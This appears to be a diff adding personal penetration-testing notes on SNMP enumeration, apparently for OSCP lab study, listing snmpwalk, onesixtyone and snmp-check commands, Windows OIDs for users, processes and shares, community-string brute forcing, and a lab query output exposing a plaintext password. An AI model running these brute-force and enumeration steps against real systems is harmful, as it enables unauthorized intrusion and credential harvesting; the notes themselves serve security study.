@@ -1,0 +1,149 @@
+UDP 161 
+snmpwalk
+snmpwalk -v X -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+└─$ snmpwalk -v 1 -c public 192.168.235.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+└─$ snmpwalk -v2c -c public 192.168.235.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+
+└─$ snmpwalk -c public -v2c 192.168.235.149 NET-SNMP-EXTEND-MIB::nsExtendObjects   
+
+
+
+
+Brute force community string
+onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>
+snmpbulkwalk -c <COMMUNITY_STRING> -v<VERSION> <IP>
+snmp-check <IP>
+
+Modifying SNMP values
+http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html
+
+└─$ snmpwalk -c public -v2c 192.168.235.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
+
+
+ SNMP(161):
+    > sudo nmap -sU --open -p 161 10.11.1.0/24 -oG open-snmp.txt
+    > snmp-check -c public 10.11.1.227
+    > snmpwalk -c public -v1 10.11.1.227 1.3.6.1.2.1.6.13.1.3
+    > snmp-walker filewithips communitystring
+    - Intersting Object IDs (OID) [Windows]
+        - 1.3.6.1.4.1.77.1.2.25 -- Windows object ID for users
+        - 1.3.6.1.2.1.25.4.2.1.2 -- Windows running processes
+        - 1.3.6.1.2.1.6.13.1.3 -- Windows open TCP ports
+        - 1.3.6.1.2.1.25.6.3.1.2 -- Windows installed software
+    - Bruteforce SNMP:
+        > sudo nmap -sU --open -p 161 10.11.1.0/24 -oG open-snmp.txt && nclean open-snmp.txt > ips2
+        > onesixtyone -c community-names-word-list.txt -i list-of-ips.txt
+        
+        
+SNMP (UDP 161)
+snmp-check 10.11.1.5
+onesixtyone -c community 192.168.186.130 
+snmpwalk -c public -v1 192.168.186.130 
+SMTP nc to 25 port and then run VRFY bob        
+
+snmpwalk 
+# Windows User Accounts
+snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25
+
+# Windows Running Programs
+snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2
+
+# Windows Hostname
+snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5
+
+# Windows Share Information
+snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1
+
+# Windows Share Information
+snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27
+
+# Windows TCP Ports
+snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3
+
+# Software Name
+snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2
+
+# brute-force community strings
+onesixtyone -i snmp-ips.txt -c community.txt
+
+snmp-check $TARGET
+
+
+ALWAYS SCAN UDP
+Discovered open port 161/udp on 192.168.217.156
+
+192.168.217.156
+
+1.3.6.1.2.1.25.1.6.0 		System Processes
+1.3.6.1.2.1.25.4.2.1.2 	Running Programs
+1.3.6.1.2.1.25.4.2.1.4 	Processes Path
+1.3.6.1.2.1.25.2.3.1.4 	Storage Units
+1.3.6.1.2.1.25.6.3.1.2 	Software Name
+1.3.6.1.4.1.77.1.2.25 	User Accounts
+1.3.6.1.2.1.6.13.1.3 	TCP Local Ports
+    Table 1 - Windows SNMP MIB values
+    
+Host IP address               : 192.168.217.156
+Hostname                      : oscp.exam
+Description                   : Linux oscp.exam 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
+Contact                       : Me <Jack@oscp>
+Location                      : Sitting on the Dock of the Bay
+
+snmpwalk -c public -v1 -t 10 192.168.50.151
+
+The following example enumerates the Windows users on the dc01 machine.
+kali@kali:~$ snmpwalk -c public -v1 192.168.217.156 1.3.6.1.4.1.77.1.2.25
+
+As another example, we can enumerate all the currently running processes:
+kali@kali:~$ snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2
+
+Similarly, we can query all the software that is installed on the machine:
+kali@kali:~$ snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2
+
+ list all the current TCP listening ports:
+kali@kali:~$ snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3
+
+snmpwalk -c public -v1 -t 10 192.168.242.151 -Oa - translates any hexadecimal string to ascii that was otherwise not decoded. 
+
+snmpwalk -c public -v1 192.168.217.156 1.3.6.1.4.1.77.1.2.25
+snmpwalk -c public -v1 192.168.217.156 1.3.6.1.2.1.25.1.6.0
+snmpwalk -c public -v1 192.168.217.156 1.3.6.1.2.1.25.2.3.1.4
+snmpwalk -c public -v1 192.168.217.156 1.3.6.1.4.1.77.1.2.25
+
+snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] NET-SNMP-EXTEND-MIB::nsExtendObjects
+
+Add NET-SNMP-EXTEND-MIB::nsExtendObjects to the snmpwalk, you can refer to https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp#enumerating-snmp
+
+ snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] NET-SNMP-EXTEND-MIB::nsExtendObjects
+snmpwalk -c public -v1 192.168.217.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
+
+└─$ snmpwalk -c public -v1 192.168.217.156 NET-SNMP-EXTEND-MIB::nsExtendObjects 
+NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 2
+NET-SNMP-EXTEND-MIB::nsExtendCommand."reset-password" = STRING: /bin/sh
+NET-SNMP-EXTEND-MIB::nsExtendCommand."reset-password-cmd" = STRING: /bin/echo
+NET-SNMP-EXTEND-MIB::nsExtendArgs."reset-password" = STRING: -c "echo \"jack:3PUKsX98BMupBiCf\" | chpasswd"
+NET-SNMP-EXTEND-MIB::nsExtendArgs."reset-password-cmd" = STRING: "\"jack:3PUKsX98BMupBiCf\" | chpasswd"
+NET-SNMP-EXTEND-MIB::nsExtendInput."reset-password" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendInput."reset-password-cmd" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendCacheTime."reset-password" = INTEGER: 5
+NET-SNMP-EXTEND-MIB::nsExtendCacheTime."reset-password-cmd" = INTEGER: 5
+NET-SNMP-EXTEND-MIB::nsExtendExecType."reset-password" = INTEGER: shell(2)
+NET-SNMP-EXTEND-MIB::nsExtendExecType."reset-password-cmd" = INTEGER: shell(2)
+NET-SNMP-EXTEND-MIB::nsExtendRunType."reset-password" = INTEGER: run-on-read(1)
+NET-SNMP-EXTEND-MIB::nsExtendRunType."reset-password-cmd" = INTEGER: run-on-read(1)
+NET-SNMP-EXTEND-MIB::nsExtendStorage."reset-password" = INTEGER: permanent(4)
+NET-SNMP-EXTEND-MIB::nsExtendStorage."reset-password-cmd" = INTEGER: permanent(4)
+NET-SNMP-EXTEND-MIB::nsExtendStatus."reset-password" = INTEGER: active(1)
+NET-SNMP-EXTEND-MIB::nsExtendStatus."reset-password-cmd" = INTEGER: active(1)
+NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."reset-password" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."reset-password-cmd" = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull."reset-password" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull."reset-password-cmd" = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd
+NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."reset-password" = INTEGER: 1
+NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."reset-password-cmd" = INTEGER: 1
+NET-SNMP-EXTEND-MIB::nsExtendResult."reset-password" = INTEGER: 256
+NET-SNMP-EXTEND-MIB::nsExtendResult."reset-password-cmd" = INTEGER: 0
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."reset-password".1 = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."reset-password-cmd".1 = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd
+
+jack:3PUKsX98BMupBiCf
